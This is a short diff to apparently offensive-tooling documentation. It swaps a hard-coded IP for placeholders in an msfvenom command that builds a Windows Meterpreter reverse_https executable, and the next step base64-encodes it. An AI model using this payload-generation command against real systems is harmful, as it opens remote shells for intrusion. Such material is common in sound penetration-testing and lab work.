@@ -15,7 +15,7 @@ The use of this files is as follows:
 - Create a Base64 Meterpreter executable:
 
     ```bash
-    sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f exe -o /var/www/html/msfstaged.exe
+    sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<LHOST> LPORT=<LPORT> -f exe -o /var/www/html/msfstaged.exe
 
     base64 /var/www/html/msfstaged.exe
     ```
